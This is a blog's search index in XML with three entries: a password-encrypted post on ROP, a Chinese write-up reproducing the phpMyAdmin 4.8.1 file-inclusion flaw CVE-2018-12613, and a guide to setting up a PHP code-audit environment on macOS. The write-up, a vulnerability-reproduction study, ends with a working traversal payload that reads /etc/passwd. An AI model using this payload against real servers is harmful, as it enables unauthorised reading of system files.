<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ROP - CTFwiki</title>
      <link href="/2019/11/26/ROP-CTFwiki/"/>
      <url>/2019/11/26/ROP-CTFwiki/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f8ec08ee4288a7f6b060fa6e89e7d1caf83022edd24c31cd15e1b99549f07ea9">9b1205c8fc9ef792601854c3a8372ddf3ab9ab7f0431dc573f680fecb9d9d9483e05e17ba016dcae79fa479fef819d1091e4645a635ef409e33069c8aa38c8db083b604a02ad6ae0b9046278b94602ceefec6286c31a398b82033996e6d8c02ebf62f961a6c1f65e68d0455d5db7ea9124feddda86a0528dd71b68e71d58715519e1d8f02572ee8b0e0dd2d6973537ad89e0d8a0d57e49f7664734131fcaec8369aa3bc2fe540b4f32d86e69ef00e953e8e7d9733ac12c419ccc7347aa90aa32c10895216f9b55c0e23f87980d9801bd42da774505e49c3868f573c054540314d6c06e8339617a052c08f20f171d2f63dcdf91fa1149933f0719afde25123cc8aa21b44a32815cede2dc963b29879e227743686c5242c599badeebe882a96f840279c01e699cb565759788015188142fe0020239182f6354a1f0891324b7024579002c7a457412a18ce22019fe346063711f0ed9ceb8204c046485b4d8536c21ab05fcbc4aabb1ccd25ba0fa01a99a5101a55e0a70fd54a4723b14aca6efc83d6dbfccc817693c6d0270e0c69385fd8abcc0c14e70cf50aedd98364c715d934bf1f86cd834ae126b5d6305e70e5787a93a014f06dee2c05d4033a20e41ad77363bbaf9495d64a030bad8b32a3ea6234e0f0f3b6c57be31b9605ca7f7105de48bb8868487fc8a36fd9fdd6f852a8f6550b3835a4b9b16ce8862f0df4a71021750737a04307397d19e54bb7a8496bcb14bce72b2b9b2850020f9b4f20f20fec308def7045c27001912158d22cdfd0bbc211838bd23ab10a43d82fdfc0977cfbfd9d0633423e34f31941bff20a9082c1d466d5684b454e562a1df3c319648a5ddae3eefcda02b64bef85e2bf5e2f90be87acd6c487e11f0714d7e37d37d70d880c17c5e9ff33db50f63d3e40ff45110acf246fde65de0efa939adec86f27dcd2cc5bb52a7c0433887139802420a2eb3e3bc6b4aa27f51c599ee06f048b74b89d2c7a7b00cef2ad25d3058441a56c9e85bc88c0c3ca05379651e195b61aa7933abd9810586c6a07b7e57cfb1567d4df39d4057137a15bb8b423cab67a7cb88450eeb9863ed3ed5ade605b484006cea0d5a1f60c042e562133ed71b9f5170074d84dac8f9c98515f974cdaa11321d99ee107f498d6d5bda5989ce9a7a1e2ac89af1c409c5e168d1f7d2a0e1e9c12df91a3bc47f350ab523ddda1fec65241655e6e4b133358d3a9c17554e65e5991a9fe5de11bd56c9015ddfb659a4e125d8ba06544edc0b7b8549def84e5b241ce663a45438c4de3de7d42e5f88f604e0496b9d8c3d226203703ae047e8fd72df5482387330e4099c986002abb886a504c3279f140628a1ac39cbd50df26f6fbbffe62b0e52f772ec9f35132a5bda9f24b3686b5cd436a4796316b0965c875e934d567392ffd4050160798597ce245a126ce24d61ddddd47f1acd7c3b1e6187e9f6f85e65efda53e3498bd8d71e36860a865b8664e0e6975313a6c0e24489868c95bfcfdba52ca8136aa74e49203709ca735d6aa2ede8f227a7a680f48d751028f8de8ed212abad2c38ba3319992d3b3fbb91bd1b567b3dac10f46d6a5dc62866a2de25f4a67cdf3f82592cb4536883592b6201a0fa9eb98c1f30c45a7531dc6065ec037d3acc725b76139a67301a32a93d786b7f06787f5ae526d33618d0e07b34550a1569995313a625779e768bad1b1bcd1cd3bbacf9e810cc2141db31942dc38ae811d956c7e87f969afbd1de60bac026fab06f56e39b090ffd082c7d5e85738b41ea1b49bca632d0256077537bd8d73776c63529f1e0ed67b006479234510b03133984efb5c0f08118d4af50c4b3e3beaebd5282b9eda2708f0708c59ac6e3deedb00b8b1c5476aadf0f8908746cc4aa6e7c3db08741a826402c70fc274e42f45498ba57bc7da395857895b19bce5a20ab05fae6741d26738fc134b2c67a642342184a6822b2970c8724f126dbd19149f2688e8bb504c760a83af448803d88270155f8e279d9157ba1621631714e47e3254988e7084f9b2861bc516e5e758b1fae2ca6f2ef93c232f65a9a4da923301788f93ed721065a43b520693af11c8c211cd8bf1ab880c28bb491180b2e4528e870a26462a7d5e5bdf36bace8df4f21713efc9b74ca651ac022f005ac8fb8c34e2cd37599cb5f6a722425200b517eb5246459962f5444e512ffb1988b345d625340afad039986fece7f1c2fe3cecfc4d0c9b736bc76e2bb6632c0d30bce91d292b279b327ca29c3dafd6241b90d30134e88b36e51fc0a3d225c6b0c79fe8b7139758ec38e99c19b1d1852659385758228e0717b3db78376551b865c8b0ba6675f6ee2c2b18a935c3252de66fe3d84bfb948bcaac9ceb37e48754943698596af8eea0251278ac325e151ff7fa631b71ea41bbbad4dd8ecda3c33c3acd997ec832570965258bd2a05461fb0c4a32f46e941cc8f34f19495bb7c6e2b56c8fec27e5d14871d45111e17e2b2a7522c37f0f13b4d3cfae32b8c003cf51bd8297c4af71ec61bc951388744262cbffbcd9e3ca4782fa6ed85971149ccb119d302bd82615c0ab53eebf43e4af617a14612d7b006bcd2b27b688ac6d17e25a65079e343839117cb36a675eb97c39986023af4c7eab44f1cc121bfda79d2b768b44ec502fc78c9fc8d8fdef5213b01602c4d1653361cdf77c4b6913ac2bb724438edd7d6bcc40d07c745c4166edb885ac1a6884fe6cec40bccdb0fed7cf98618bc2ec12229820cb500cb360a8416f16c19fa4306224e03ef40008b15e357433de6f8b78a23d25ed36e910a70f642e6475748c296b414ed1fc40e55acaaa1929a0fa3b969ace175c12dd9e96f42d781a74410d65f2b0706be5424b731394a1a9da75950d3e26d66c3170cabfc21e90cb9c2460ea7fadbd9a7cb19aaea10fc06221789008151f1d5ae0a7016e9ce341dabf90bb299f1872a93d715db2a759e1b86d7c3ea7019a197a0b0e643480094b8040c4983aeaf23eff7103ec22c969f4b158e7335c88cc5ebdf4d35190546d3ee5dcff1739913560561d809740b7b02cf8670fc81c99eed0989c9d6206a0f94bfe8733f0c0d46fbecfa1e22154039e1a8369001dd4bd2e680bfa0ae76611f86d1e630827dcbe1863e6dfd9f4164d0a08d199fcd1a37bd2bfda6ec72f0c249413e44c6e1f6bc5464f93ab5008747e9bf5a5d16533a89ee21276a18797f66a66ab4c2e24a2d8f246ed5ca5d73449f0712cdf343a1132fecec45c8404b0bbb9b30ee802ea1dc7f013bd6fbafdbe41dc200f8cd19e1f35458346ad2db4970a6c119157675e9dd4256ac1bb86e7093c5188cd49702c75489e29e11ad01e603bca0738eed477d2a582e64b910ebf4730339d9b5ca1f06eda94ff36476a5fe25bde0279731c8301a7b251ba2355da5bd29788dbd2277f3558fc408b54bee1e43daa6e2b4a5e0aa036b4d39f8840aed9180436dbe6481f1a694e9f70895e889424a9892db50fa8ed109c0974ac3e96da2f0867f6daad01f56d77121f917489bff35b7d85c6151f237ca2333b1ac626450b5a5809f3c2deb38d3b6eb3decc533fc51ba4314e34357a22233e5b2f6c1b12c7b5484b380639af5002947eeae6455a9f08b531cf47effa5e3674417cfc10f7e40f46b25320444fd842a26463f81678dd79de5b8f3e1893c9156911e61ec8b5e12a025812176d5c53c9da8bc49ed1c174254864bf27bb4304fafc52f94dc1ac9ef5596db4014dd108a913e1d677d521cd095947e720ff436a6abb4c75b8b6247e26f4a6078d26ed3f0cbe86381ba5cb4e1ff36bd0b922e82e805c9f2cc17e64344bb20ff331ec8cbb658f778b751862a3e3b4f8831e31378f7d3e755a9ffb63b1f27b909b9abde9e2bc8d2af90b6ef5f64f71c577f1a39c1556b92383eb27dfb2f4f257b1d26699a045802f34d9100783e5f46d897714f6109e92edf6c378226f740555e0d5a72f51e1e2b71eb1d3b73c8e4da1f3f895eab3831c39810b13fa81a40d2b294127967fa4c324b3624d45f6145e51452560225b7172a416615aa4e15f674c4e8181d5202f5fd692b78789480fa9eb7f74373c163f1bdc04db84e0b1d60ffecd8123c3b3426b614686fdebc44dcd1b3d23bb7678feffded19c00d9f08aad6116d927707c5b91eedcdc1c253d57fc8bddf1e1ce48865af90965d59896d4e56e524982549eaca620a5331e7d3a92ddafca51d0801dc00bf419e13d6658cb224f211104c70eecd341a142fe490e83028fde1d5ff7bec1bcdb21a754620d8e27c59028fbdf8c307970df45ad9877d94c6d77101ea7e963def5373ee48896da1d286867df682ee9021e1a27637d34675f02591fb6865650b38f2b18048db6704961749725bda022bf6254f7579e0bd6c56a42e8fe2ad28d6c4630ae4ef011361c0c89c0d80a576d3f1b8eeca1b1523e317108a7e2fb910d7a95aebba7ce072818f46c92a138c54927d72a94aa13435a642f51ff9a0ae7f302307cd8aabdc96b0a4d58d2ec420e753acd87780edb611ebe067bf44979a0cb7931572586a169428960a9d275bcef3ef1d050fde9d467b4bfbdcee53fd3d51735c71dd95ad4ed5fee9b9c6f036ad0f6f0ce7cbb03f95b8c947e6ea727fb5a72946102f294258161c0362b0079bee4142d674cac0e0fe0eb6c195c01595ddb157d7c0b7aed8576ba9aca811f7d237822b4e40b325bc7e2a74c5c76536e63962b9491ededa686ad83c17082e8d0047940d4f3ae8cf1b5a91837bbbd18d054ba09c615670a7d344857a9564de291592eb75d00e89a564bcf340a092736ca9dd9aa65663a9a25acc06389daa157da9a11b7f72c669e8ce371c67a63c1bd484cc5b2040605739fcab960a3492120f7763dbe218db36839856b322d69545508d7beb965e2ee69b4fb04942de2561552e96b6178e51fca9ececa7e7763904ffc2be636fe1c8412416ea39e4ab3b512efa1d2a12f2326833ddb8949099d17f877354ff5b411adc3d417e733fe31744a051a34a16083083fbe7d4b5fbca5f64e635a47994aff2b591f806a9805b15e71cb7095a3f75d000ce4806b9b5a61dddb29684608d870bc6e2246d6f073988a709314cfc7d05a32c5a9cb387b1d834c9368380e987a47938cbb33cb05f1c40e323594c43883da0a908921053f3018764fec9961567ee7fc33c25c282eeb42def6b5d93d15b56de9c37007ca5fe0cbf5555d67d42be4d359957af788d7ec609aa2b1a62c3ee6dfc0af60991dc8d6d227c70716828c392510ab988e00b5fe218a2dc069e848360dc9a7729584c27aabd80d6c30d9617d9bfd4c4e7cb33aa7d103b375a1d2479a9d34e575b89b781f624aa20d69fab996887c2507e3c82a8acd1a0ee21131016ecee2eaaeb232e05af33eeb1024cd79c0a646881b13063128b2b277c5482d8f0fb7bf47540db73aa5fa8bbafbca1473c23f27e8119853e8dec35330fd0ce57014712b18aeda8593263a787c6a2f466ed5924158997e46ca5c9bcb4daa968e71c7f1fb89574e3cc84b3a9a9a9937e4212bd18ff34ef51807c5d7ab1e63bb2a94eb7f7d965dc994143e3fba4a91b38e9383104eeb09317d498e4aa35a44b1ce82fcd0f2e6a82fb06b6aa1f96caed0750d1e8f69f1c329c4d6769b95ab01a7b560bf3d1c176305a2a698eb28bb6cbe14dd89280255c55459a0d6e69e9a86b40a0182cac77e683ad41d6a7520ec0bb1a789dd24d926d9a98fb1363f1546fb8cf42ef249bb29cf60f591b95e879e9e9f8a388f09ece86ec08e1b796d70c5d9c7f17d45c6d0845438bffd7ec34c411c135ae2ea3e50509f7044a97550ea9a10dcce60438658b267259a73ebe016b0dac38506ff755202a907fd1d3925619ac6a1943f31bef8bfe0104e65dadc6f6970eda0232d062dc3bd325a816efd050228f6aa3a54339738de5dc10ac26b7e0d1bc2f36d50427a965d09ec77f154cb5184c2fe1574b44d9f91b77505c9d52920fe1273a462fe735a15b2462e16786b90684e58e074e9d416c1e579479d0b1ff55107b2637980c577c341e6da1a7abaf76afe28ef926c8cdf35a05fd367a8fc5f9afd2a96e03c001af9f776d550728d61f5c9fbc5a45588f8c2cb437245ce9e21c0a15b600421f6feda5caa0cb92cf566491c7f6b3fa56336a9189ec69307daba95ce6ac33f5eff1381326a2f63d4e12edf9fc09b05d1cf7cb762d2cafe9ca449162283be1fec41c0eb661149df9014efa575c9e18bd02856f2e3f07632a45481599f4c6c10b50b61f5a0183f11efc1468b5df0bbc1211969d9b29523f42a45a5ffee0441ffe5c34ae9edd9c8975e882151810d2f544903ce2a7ae6201e70220875e9fd36cbd83103385ee0addb7bbeb84783ee5432e9b5e6240bd16f4bb3ac1b1e92a31bcfcb4bec30d98fa81e3b0a35b893a71ee09848056e1a0b1f71178e8c3d4703e5e24e70599fd74708ec5724dfd44a1c0bf1052ba8380fe45852f8e3be9a3f75d98ecef4a504050dc2d685c5e5bb3ec71efe2ab4e3072c1832bb48e4ee2be7e40d8c4f19cbb8c3f6080b2e4c7cda1ad79f5547197f0d7e1866246238a090d90a3819a68ba09fca8f11317591bea5d5da7bf73bedac3e7aed4cc5b7178b638f5c9ef81dfb6800b0bbc5f70335dcf7f2daaf8bfe6843fee5ebcbfd4044f8e6ba4a0fcb9e2c33e017ea3844a978300e33de72ed53e4ea956aeb36a6208ffb730968295388fee0d7097266300a23abe65cf8acd850aab517d5e39b80a9702147c2de59ad11654564ec236423c731968e15d45dabf2d5d3b4628ed2b89e62caf4b77e79267867b1c6747bc112dd4ad33ea5da7d2fbdc81e7491f9870fdb6e9964f4b445f0ea1a34e83163edd734b76cf0053502eb4ca180e3c0fb948c41934b670429bae3fc107a26afc78c305491fac8cd564825a39deceb83168e5c795401b7f08ddbf48cdbd2517630d4e2262a03f3376aed08d03cfaf066d077f9ebc96bb8d091faf6ca4daf2a474384a24f51044d314a33ff6db64c68613524c36006a91d16add492881b33c412334d371f004028a8f0a73b89945facf1552990f25b9a0d79cc84754018166e63d4bd3848f1ddd20af525c673b3af546e26fddae45130acfb58519c998de071d410b8525503f29fd6d59c99d9989ddab857668e235676c27daf7828e19d4f35bd5c8b50e686697e2710cb6abe28f9290b08546d27949bceccd66bd99ffe0442b80bc331ef0df175ff085a91576d7d257affeac065eee88096163b688f30fe6897d2ec741d5e6ed93dcce7dba60171cfae86a6bb2e267dd1a902c43f0dd46e85a08f1fe0bbbf8563f0bb3d6f771d25e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 远程文件包含漏洞(CVE-2018-12613)</title>
      <link href="/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/"/>
      <url>/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>mac + php5.6 + apache + mysql5.5 + xdebug-2.5.5</p><p>phpmyadmin 4.8.1 下载链接： </p><ul><li><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip</a></li></ul><p><strong>确保 mysql 启动无误。</strong></p><p>下载并移动 phpmyadmin 源代码到本地 web 根目录中，修改配置文件：</p><pre><code class="bash">cp config.sample.inc.php config.inc.php</code></pre><p>修改 <code>config.inc.php</code> 文件：</p><p><img src="../../../../img/phpmyadmin1.png" alt=""></p><p>安装完成。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>index.php ：55 行左右</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>通过 get 方式传入的 target 参数，有可能进入 include 函数，从而导致任意文件包含。 但是要经过上述几个判断，简单梳理一下 target 需要满足的条件：</p><ol><li>参数不为空，且是 string 类型</li><li>不能以 index 开头</li><li>不能在黑名单中（import.php exprot.php）</li><li>通过 <code>Core::checkPageValidity</code> 方法的判断</li></ol><p>跟进 <code>Core::checkPageValidity</code>：</p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = []){    if (empty($whitelist)) {        $whitelist = self::$goto_whitelist;    }    if (! isset($page) || !is_string($page)) {        return false;    }    if (in_array($page, $whitelist)) {        return true;    }    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    return false;}</code></pre><p>不管哪一种情况，都要求 page 参数满足 isset 和 is_string 。这是肯定满足的，我们主要梳理一下这一段代码对 page 参数的其他要求：</p><ol><li>首先获取一个白名单</li><li>page 参数在白名单中</li><li>page 参数截取第一个 <code>?</code> 前的子串，子串在白名单中</li><li>page 参数先 url 解码后，再截取第一个 <code>?</code> 前的子串，子串在白名单中</li></ol><p>梳理下攻击思路：</p><ol><li>白名单是已知的，这里随便选一个 db_datadict.php 。</li><li>既然我们走到了 include 这里，那就尽可能让传进来的参数，任意满足上面一种情况，并且仍然可以通过目录穿越，包含到任意文件。<br><img src="../../../../img/phpmyadmin2.jpg" alt=""></li></ol><h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><pre><code class="php">/index.php?target=db_datadict.php%253f/../../../../../../../../../etc/passwd</code></pre><p>该 payload 使得 page 参数满足最后一种条件，也就是 url 解码后，截取第一个问号 <code>?</code> 之前的子串，子串（db_datadict.php）在白名单中。</p><p><img src="../../../../img/phpmyadmin3.png" alt=""></p><p><img src="../../../../img/phpmyadmin4.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计环境搭建</title>
      <link href="/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="mac-mamp-xdebug"><a href="#mac-mamp-xdebug" class="headerlink" title="mac mamp + xdebug"></a>mac mamp + xdebug</h1><h2 id="install-required-libraries"><a href="#install-required-libraries" class="headerlink" title="install required libraries"></a>install required libraries</h2><pre><code class="angular2html">brew install openldap libiconv</code></pre><h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><pre><code class="angular2html">sudo apachectl stopsudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist 2&gt;/dev/nullbrew install httpdsudo brew services start httpd</code></pre><h2 id="Multiple-Versions-PHP"><a href="#Multiple-Versions-PHP" class="headerlink" title="Multiple Versions PHP"></a>Multiple Versions PHP</h2><pre><code class="angular2html">brew tap exolnet/homebrew-deprecatedbrew install php@5.6brew install php@7.0brew install php@7.1brew install php@7.2brew install php@7.3</code></pre><h2 id="PHP-Switcher-Script-sphp"><a href="#PHP-Switcher-Script-sphp" class="headerlink" title="PHP Switcher Script (sphp)"></a>PHP Switcher Script (sphp)</h2><pre><code class="angular2html">curl -L https://gist.githubusercontent.com/rhukster/f4c04f1bf59e0b74e335ee5d186a98e2/raw &gt; /usr/local/bin/sphpchmod +x /usr/local/bin/sphp</code></pre><p>example:</p><pre><code class="angular2html">Switching to php@7.1Switching your shellUnlinking /usr/local/Cellar/php@5.6/5.6.40... 319 symlinks removedUnlinking /usr/local/Cellar/php@7.0/7.0.33... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.1/7.1.32_1... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.2/7.2.23... 0 symlinks removedUnlinking /usr/local/Cellar/php/7.3.10... 208 symlinks removedLinking /usr/local/Cellar/php@7.1/7.1.32_1... 25 symlinks createdIf you need to have this software first in your PATH instead consider running:  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/sbin:$PATH&quot;&#39; &gt;&gt; ~/.zshrcYou will need sudo power from now onSwitching your apache confRestarting apachePHP 7.1.32 (cli) (built: Oct  6 2019 20:44:48) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies    with Zend OPcache v7.1.32, Copyright (c) 1999-2018, by Zend TechnologiesAll done!</code></pre><p>切换为 php 5.6 ：<br><img src="../../../../img/2.jpg" alt=""></p><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code class="angular2html">pecl install xdebug</code></pre><p>随后在 vscode 或者 phpstorm 中配置 xdebug 即可。</p><h3 id="vscode-安装-xdebug-："><a href="#vscode-安装-xdebug-：" class="headerlink" title="vscode 安装 xdebug ："></a>vscode 安装 xdebug ：</h3><p>比较简单，直接安装 vscode 插件 phpdebug 即可，也不需要特别多的配置。</p><p><img src="../../../../img/3.jpg" alt=""><br><img src="../../../../img/4.jpg" alt=""></p><h3 id="phpstorm-安装-xdebug-："><a href="#phpstorm-安装-xdebug-：" class="headerlink" title="phpstorm 安装 xdebug ："></a>phpstorm 安装 xdebug ：</h3><p>相对复杂一点：</p><p><img src="../../../../img/5.png" alt=""><br><img src="../../../../img/6.png" alt=""><br><img src="../../../../img/7.png" alt=""></p><p>然后就可以开始尽情的代码审计了。<br><strong>没有断点，不用动态调试的代码审计，等于白给。</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener">https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
